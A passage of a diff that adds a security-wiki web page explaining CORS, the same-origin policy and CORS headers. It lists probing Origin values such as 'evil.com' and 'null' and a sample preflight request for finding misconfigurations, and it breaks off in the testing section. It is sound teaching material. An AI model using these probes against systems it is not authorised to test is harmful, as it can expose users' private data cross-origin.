@@ -1,0 +1,1895 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="CORS # What is CORS? # Cross-Origin Resource Sharing (CORS) is a browser security mechanism that controls how web applications on one origin can request resources from another origin. It works through HTTP response headers such as Access-Control-Allow-Origin, which define which external domains are permitted to access the resource. By default, browsers block cross-origin requests for security, and CORS provides a controlled way to relax this restriction when needed. Misconfigured CORS policies can expose sensitive data or allow unauthorized cross-origin interactions.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="CORS" />
+<meta property="og:description" content="CORS # What is CORS? # Cross-Origin Resource Sharing (CORS) is a browser security mechanism that controls how web applications on one origin can request resources from another origin. It works through HTTP response headers such as Access-Control-Allow-Origin, which define which external domains are permitted to access the resource. By default, browsers block cross-origin requests for security, and CORS provides a controlled way to relax this restriction when needed. Misconfigured CORS policies can expose sensitive data or allow unauthorized cross-origin interactions." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/CORS/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-13T23:21:07+05:30" />
+<title>CORS | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class=" active">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>CORS</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cors">CORS</a>
+      <ul>
+        <li><a href="#what-is-cors">What is CORS?</a></li>
+        <li><a href="#how-cors-works-high-level-flow">How CORS Works (High-Level Flow)</a></li>
+        <li><a href="#sop">SOP</a></li>
+        <li><a href="#key-http-headers-in-cors">Key HTTP Headers in CORS</a>
+          <ul>
+            <li><a href="#origin-request-header">Origin (Request Header)</a></li>
+            <li><a href="#access-control-allow-origin-response-header">Access-Control-Allow-Origin (Response Header)</a></li>
+            <li><a href="#access-control-allow-credentials-response-header">Access-Control-Allow-Credentials (Response Header)</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surfaces">Attack Surfaces</a>
+          <ul>
+            <li><a href="#origin-based-attack-surface">Origin-Based Attack Surface</a></li>
+            <li><a href="#credentialed-attack-surface">Credentialed Attack Surface</a></li>
+            <li><a href="#preflight-attack-surface">Preflight Attack Surface</a></li>
+          </ul>
+        </li>
+        <li><a href="#testing-for-cors-misconfiguration">Testing for CORS Misconfiguration</a></li>
+        <li><a href="#exploiting-cors-misconfigurations">Exploiting CORS Misconfigurations</a>
+          <ul>
+            <li><a href="#origin-reflection">Origin Reflection:</a></li>
+            <li><a href="#whitelisted-null-origin">Whitelisted null origin</a></li>
+            <li><a href="#xss-on-trusted-origin">XSS on Trusted Origin</a></li>
+            <li><a href="#wildcard-origin-without-credentials">Wildcard Origin without credentials</a></li>
+            <li><a href="#weak-regular-expression-bypass">Weak Regular Expression Bypass</a></li>
+            <li><a href="#advance-regular-expression-bypass">Advance Regular Expression Bypass</a></li>
+            <li><a href="#xssijsonp-bypass">XSSI/JSONP Bypass</a></li>
+            <li><a href="#iframe--popup-bypass">Iframe + Popup Bypass</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection"><strong>Detection</strong></a></li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention">Prevention</a></li>
+        <li><a href="#tools">Tools</a>
+          <ul>
+            <li><a href="#good-to-read">Good to Read:</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="cors">
+  CORS
+  <a class="anchor" href="#cors">#</a>
+</h1>
+<h2 id="what-is-cors">
+  What is CORS?
+  <a class="anchor" href="#what-is-cors">#</a>
+</h2>
+<p>Cross-Origin Resource Sharing (CORS) is a browser security mechanism that controls how web applications on one origin can request resources from another origin. It works through HTTP response headers such as <code>Access-Control-Allow-Origin</code>, which define which external domains are permitted to access the resource. By default, browsers block cross-origin requests for security, and CORS provides a controlled way to relax this restriction when needed. Misconfigured CORS policies can expose sensitive data or allow unauthorized cross-origin interactions.</p>
+<h2 id="how-cors-works-high-level-flow">
+  How CORS Works (High-Level Flow)
+  <a class="anchor" href="#how-cors-works-high-level-flow">#</a>
+</h2>
+<ol>
+<li>A web page makes a request to a different origin.</li>
+<li>The browser automatically adds an <code>Origin</code> header to the request.</li>
+<li>The server decides whether this origin is allowed.</li>
+<li>If allowed, the server sends appropriate CORS response headers.</li>
+<li>The browser enforces the decision and either:
+<ul>
+<li>Allows the response to be read, or</li>
+<li>Blocks it.</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>CORS is enforced by <strong>browsers</strong>, not by servers.</p>
+<p>Direct requests made via curl, Burp, or scripts are not blocked by CORS.</p>
+</blockquote>
+<h2 id="sop">
+  SOP
+  <a class="anchor" href="#sop">#</a>
+</h2>
+<p>A <strong>same-origin</strong> policy mandates that a <strong>server requesting</strong> a resource and the server hosting the <strong>resource</strong> share the same protocol (e.g., <code>http://</code>), domain name (e.g., <code>internal-web.com</code>), and <strong>port</strong> (e.g., 80). Under this policy, only web pages from the same domain and port are allowed access to the resources.</p>
+<p>The application of the same-origin policy in the context of <code>http://normal-website.com/example/example.html</code> is illustrated as follows:</p>
+<table>
+<thead>
+<tr>
+<th>URL accessed</th>
+<th>Access permitted?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>http://normal-website.com/example/</code></td>
+<td>Yes: Identical scheme, domain, and port</td>
+</tr>
+<tr>
+<td><code>http://normal-website.com/example2/</code></td>
+<td>Yes: Identical scheme, domain, and port</td>
+</tr>
+<tr>
+<td><code>https://normal-website.com/example/</code></td>
+<td>No: Different scheme and port</td>
+</tr>
+<tr>
+<td><code>http://en.normal-website.com/example/</code></td>
+<td>No: Different domain</td>
+</tr>
+<tr>
+<td><code>http://www.normal-website.com/example/</code></td>
+<td>No: Different domain</td>
+</tr>
+<tr>
+<td><code>http://normal-website.com:8080/example/</code></td>
+<td>No: Different port*</td>
+</tr>
+</tbody>
+</table>
+<h2 id="key-http-headers-in-cors">
+  Key HTTP Headers in CORS
+  <a class="anchor" href="#key-http-headers-in-cors">#</a>
+</h2>
+<h3 id="origin-request-header">
+  Origin (Request Header)
+  <a class="anchor" href="#origin-request-header">#</a>
+</h3>
+<p>The <code>Origin</code> header is automatically added by the browser when making a cross-origin request.</p>
+<p>It tells the server:</p>
+<blockquote>
+<p>“This request originated from this website.”</p>
+</blockquote>
+<p><strong>Example:</strong></p>
+<pre tabindex="0"><code>Origin: https://evil-site.com
+</code></pre><h3 id="access-control-allow-origin-response-header">
+  Access-Control-Allow-Origin (Response Header)
+  <a class="anchor" href="#access-control-allow-origin-response-header">#</a>
+</h3>
+<p>This response header tells the browser <strong>which origin is allowed to read the response</strong>.</p>
+<p><strong>Example (secure):</strong></p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: https://trusted-site.com
+</code></pre><p><strong>Example (insecure):</strong></p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: *
+</code></pre><h3 id="access-control-allow-credentials-response-header">
+  Access-Control-Allow-Credentials (Response Header)
+  <a class="anchor" href="#access-control-allow-credentials-response-header">#</a>
+</h3>
+<p>This header indicates whether the browser is allowed to include <strong>credentials</strong> in cross-origin requests.</p>
+<p>Credentials include:</p>
+<ul>
+<li>Cookies</li>
+<li>Authorization headers</li>
+<li>TLS client certificates</li>
+</ul>
+<p><strong>Example:</strong></p>
+<pre tabindex="0"><code>Access-Control-Allow-Credentials: true
+</code></pre><p>Invalid and insecure:</p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+</code></pre><h2 id="attack-surfaces">
+  Attack Surfaces
+  <a class="anchor" href="#attack-surfaces">#</a>
+</h2>
+<h3 id="origin-based-attack-surface">
+  Origin-Based Attack Surface
+  <a class="anchor" href="#origin-based-attack-surface">#</a>
+</h3>
+<p>Test how the backend handles different <code>Origin</code> values:</p>
+<pre tabindex="0"><code>Origin: https://evil.com
+Origin: https://trusted.com.evil.com
+Origin: https://evil-trusted.com
+Origin: null
+Origin: file://
+</code></pre><p>If <strong>any untrusted origin</strong> is reflected in:</p>
+<pre tabindex="0"><code>Access-Control-Allow-Origin
+</code></pre><p>→ You have a CORS misconfiguration candidate.</p>
+<h3 id="credentialed-attack-surface">
+  Credentialed Attack Surface
+  <a class="anchor" href="#credentialed-attack-surface">#</a>
+</h3>
+<p>If responses include:</p>
+<pre tabindex="0"><code>Access-Control-Allow-Credentials: true
+</code></pre><p>Then the impact is much higher because:</p>
+<ul>
+<li>Cookies are sent</li>
+<li>Auth headers are sent</li>
+<li>Sensitive data can be stolen cross-origin</li>
+</ul>
+<p>This is <strong>Account Takeover / Private Data Disclosure class impact</strong>.</p>
+<h3 id="preflight-attack-surface">
+  Preflight Attack Surface
+  <a class="anchor" href="#preflight-attack-surface">#</a>
+</h3>
+<p>Check how the backend responds to:</p>
+<pre tabindex="0"><code>OPTIONS /endpoint
+Origin: https://evil.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: Authorization
+</code></pre><p>Overly permissive preflight responses increase the attack surface for:</p>
+<ul>
+<li>PUT / DELETE / PATCH</li>
+<li>Privileged operations</li>
+<li>Token-based APIs</li>
+</ul>
+<h2 id="testing-for-cors-misconfiguration">
+  Testing for CORS Misconfiguration
+  <a class="anchor" href="#testing-for-cors-misconfiguration">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Request</span> <span style="color:#a6e22e">Header</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Response</span> <span style="color:#a6e22e">Header</span>
+</span></span><span style="display:flex;"><span>
